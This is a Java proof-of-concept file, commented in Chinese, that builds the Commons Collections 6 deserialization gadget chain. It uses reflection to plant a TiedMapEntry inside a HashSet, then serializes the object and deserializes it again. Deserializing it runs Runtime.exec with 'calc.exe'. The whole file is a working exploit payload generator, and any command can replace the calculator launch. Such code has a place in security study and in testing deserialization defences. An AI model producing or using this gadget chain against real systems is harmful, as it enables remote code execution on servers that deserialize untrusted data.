package org.payload.cc.CC6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections6HashSet {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[]{"calc.exe"}),
                new ConstantTransformer(1) };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(lazyMap, "x");

        /*不利用反射
        //HashSet hashSet = new HashSet(1);
        //hashSet.add(entry);
        //lazyMap.remove("x");
         */

        HashSet hashSet = new HashSet(1);
        hashSet.add("test");
        // 反射获取HashSet中map的值
        Field map =  Class.forName("java.util.HashSet").getDeclaredField("map");
        // 取消访问限制检查
        map.setAccessible(true);
        // 获取HashSet中map的值
        HashMap hashSetMap = (HashMap) map.get(hashSet);

        // 反射获取 HashMap 中 table 的值
        Field table =  Class.forName("java.util.HashMap").getDeclaredField("table");
        // 取消访问限制检查
        table.setAccessible(true);
        // 获取 HashMap 中 table 的值
        Object[] hashMapTable = (Object[]) table.get(hashSetMap);

        Object node = hashMapTable[0];
        if(node == null) {
            node = hashMapTable[1];
        }

        // 将 key 设为 tiedMapEntry
        Field key =  node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node, tme);

        //序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashSet);
        oos.close();
        byte[] out = barr.toByteArray();
        System.out.println(Arrays.toString(out));
        //System.out.println(barr.toByteArray());
        //System.out.println(barr);

        //反序列化
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();


    }
}
